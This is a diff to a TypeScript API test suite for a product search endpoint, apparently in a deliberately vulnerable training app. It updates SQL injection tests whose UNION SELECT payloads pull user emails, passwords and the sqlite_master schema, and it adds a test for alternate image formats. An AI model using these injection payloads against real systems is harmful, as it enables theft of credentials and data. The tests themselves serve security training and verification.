@@ -77,20 +77,20 @@ void describe('/rest/products/search', () => {
 
   void it('GET product search can create UNION SELECT with Users table and fixed columns', async () => {
     const res = await request(app)
-      .get("/rest/products/search?q=')) union select '1','2','3','4','5','6','7','8','9' from users--")
+      .get("/rest/products/search?q=')) union select '1','2','3','4','5','6','7','8','9','10' from users--")
     assert.equal(res.status, 200)
     assert.ok(res.headers['content-type']?.includes('application/json'))
     const match = res.body.data.find((item: any) =>
       item.id === '1' && item.name === '2' && item.description === '3' &&
       item.price === '4' && item.deluxePrice === '5' && item.image === '6' &&
-      item.createdAt === '7' && item.updatedAt === '8'
+      item.createdAt === '8' && item.updatedAt === '9'
     )
     assert.ok(match, 'Expected to find a row with fixed column values from UNION SELECT')
   })
 
   void it('GET product search can create UNION SELECT with Users table and required columns', async () => {
     const res = await request(app)
-      .get("/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--")
+      .get("/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9','10' from users--")
     assert.equal(res.status, 200)
     assert.ok(res.headers['content-type']?.includes('application/json'))
 
@@ -127,7 +127,7 @@ void describe('/rest/products/search', () => {
 
   void it('GET product search can create UNION SELECT with sqlite_master table and required column', async () => {
     const res = await request(app)
-      .get("/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--")
+      .get("/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9','10' from sqlite_master--")
     assert.equal(res.status, 200)
     assert.ok(res.headers['content-type']?.includes('application/json'))
 
@@ -202,5 +202,22 @@ void describe('/rest/products/search', () => {
     assert.equal(searchRes.status, 200)
     assert.ok(searchRes.headers['content-type']?.includes('application/json'))
     assert.equal(searchRes.body.data.length, products.length)
+  })
+
+  void it('GET product search returns alternateImages as array with format and size descriptor', async () => {
+    const res = await request(app)
+      .get('/rest/products/search?q=apple')
+    assert.equal(res.status, 200)
+    assert.ok(res.headers['content-type']?.includes('application/json'))
+    const appleJuice = res.body.data.find((product: any) => product.name === 'Apple Juice (1000ml)')
+    assert.ok(appleJuice, 'Expected Apple Juice in search results')
+    assert.ok(Array.isArray(appleJuice.alternateImages), 'Expected alternateImages to be an array')
+    assert.ok(appleJuice.alternateImages.length >= 1)
+    assert.ok(appleJuice.alternateImages.some((image: any) => image.format === 'image/avif'))
+    for (const alternateImage of appleJuice.alternateImages) {
+      assert.equal(typeof alternateImage.file, 'string')
+      assert.equal(typeof alternateImage.format, 'string')
+      assert.ok(typeof alternateImage.density === 'string' || typeof alternateImage.width === 'string', 'Expected either density or width descriptor')
+    }
   })
 })
